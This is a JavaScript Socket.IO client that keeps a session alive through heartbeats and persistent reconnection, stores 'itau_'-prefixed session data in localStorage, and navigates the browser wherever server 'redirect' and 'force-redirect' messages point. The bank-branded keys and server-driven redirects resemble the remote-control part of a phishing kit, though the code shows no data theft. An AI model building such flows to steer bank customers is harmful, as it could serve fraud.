// Socket.IO Connection Handler with enhanced reconnection and heartbeat
(function() {
    'use strict';
    
    // Socket configuration with robust reconnection
    const socket = io({
        reconnection: true,
        reconnectionDelay: 500,
        reconnectionDelayMax: 2000,
        reconnectionAttempts: Infinity,
        timeout: 30000,
        transports: ['polling'],
        upgrade: false,
        autoConnect: true,
        forceNew: false,
        path: '/socket.io/',
        closeOnBeforeunload: false
    });

    let sessionId = localStorage.getItem('itau_session_id');
    let heartbeatInterval = null;
    let isConnected = false;
    let reconnectAttempts = 0;
    let visibilityCheckInterval = null;

    // Start heartbeat to keep session alive
    function startHeartbeat() {
        if (heartbeatInterval) {
            clearInterval(heartbeatInterval);
        }
        
        heartbeatInterval = setInterval(() => {
            if (sessionId) {
                if (isConnected) {
                    socket.emit('heartbeat');
                } else if (!socket.connected) {
                    console.log('Reconectando desde heartbeat...');
                    socket.connect();
                }
            }
        }, 10000); // Every 10 seconds
    }

    // Log all socket events
    socket.onAny((eventName, ...args) => {
        console.log(`📡 Socket event: ${eventName}`, args);
    });

    // Stop heartbeat
    function stopHeartbeat() {
        if (heartbeatInterval) {
            clearInterval(heartbeatInterval);
            heartbeatInterval = null;
        }
    }

    // Start visibility check
    function startVisibilityCheck() {
        if (visibilityCheckInterval) {
            clearInterval(visibilityCheckInterval);
        }
        
        visibilityCheckInterval = setInterval(() => {
            if (document.hidden === false && !socket.connected && sessionId) {
                console.log('Pagina visible, reconectando...');
                socket.connect();
            }
        }, 2000);
    }

    // Initialize session on connection
    socket.on('connect', () => {
        console.log('✅ Socket conectado:', socket.id);
        isConnected = true;
        reconnectAttempts = 0;
        socket.emit('init-session', { sessionId });
        
        localStorage.setItem('itau_last_connect', Date.now());
        localStorage.setItem('itau_socket_id', socket.id);
    });

    socket.on('session-ready', (data) => {
        sessionId = data.sessionId;
        localStorage.setItem('itau_session_id', sessionId);
        localStorage.setItem('itau_session_time', Date.now());
        console.log('Session ready:', sessionId, data.reconnected ? '(reconnected)' : '(new)');
        startHeartbeat();
        startVisibilityCheck();
    });

    socket.on('heartbeat-ack', () => {
        console.log('Heartbeat OK');
    });

    socket.on('disconnect', (reason) => {
        console.log('Socket desconectado:', reason);
        isConnected = false;
        
        // Siempre intentar reconectar en moviles
        setTimeout(() => {
            if (!socket.connected && sessionId) {
                console.log('Forzando reconexion...');
                socket.connect();
            }
        }, 500);
    });

    socket.on('connect_error', (error) => {
        console.error('Error de conexion:', error.message);
        isConnected = false;
        reconnectAttempts++;
        
        // Reintentar mas agresivamente
        if (reconnectAttempts < 10) {
            setTimeout(() => {
                if (!socket.connected && sessionId) {
                    socket.connect();
                }
            }, 1000);
        }
    });

    socket.on('reconnect', (attemptNumber) => {
        console.log('Reconectado despues de', attemptNumber, 'intentos');
        isConnected = true;
        reconnectAttempts = 0;
    });

    socket.on('reconnect_attempt', (attemptNumber) => {
        console.log('Intento de reconexion:', attemptNumber);
    });

    socket.on('reconnect_error', (error) => {
        console.error('Error de reconexion:', error.message);
    });

    socket.on('reconnect_failed', () => {
        console.error('Reconexion fallida');
    });

    // Handle redirect commands
    socket.on('redirect', (data) => {
        console.log('🔄 Redirect recibido:', data);
        if (data.clearData) {
            localStorage.removeItem('itau_session_id');
            sessionId = null;
        }
        setTimeout(() => {
            window.location.href = data.page;
        }, 100);
    });

    // Handle force redirect (backup)
    socket.on('force-redirect', (data) => {
        console.log('🔄 Force-redirect recibido:', data);
        if (data.clearData) {
            localStorage.removeItem('itau_session_id');
            sessionId = null;
        }
        window.location.href = data.page;
    });

    // Handle page visibility changes (mobile apps)
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden) {
            console.log('Pagina ahora visible');
            if (!socket.connected && sessionId) {
                console.log('Reconectando al volver a la pagina...');
                socket.connect();
            }
        } else {
            console.log('Pagina ahora oculta');
        }
    });

    // Handle page focus
    window.addEventListener('focus', () => {
        console.log('Ventana con foco');
        if (!socket.connected && sessionId) {
            console.log('Reconectando al obtener foco...');
            socket.connect();
        }
    });

    // Handle page blur
    window.addEventListener('blur', () => {
        console.log('Ventana sin foco');
    });

    // Expose socket and sessionId globally
    window.itauSocket = socket;
    window.getSessionId = () => sessionId;
    window.setSessionId = (id) => {
        sessionId = id;
        localStorage.setItem('itau_session_id', id);
    };
    window.clearSessionData = () => {
        if (socket.connected) {
            socket.emit('clear-session');
        } else {
            socket.once('connect', () => {
                socket.emit('clear-session');
            });
        }
    };
})();
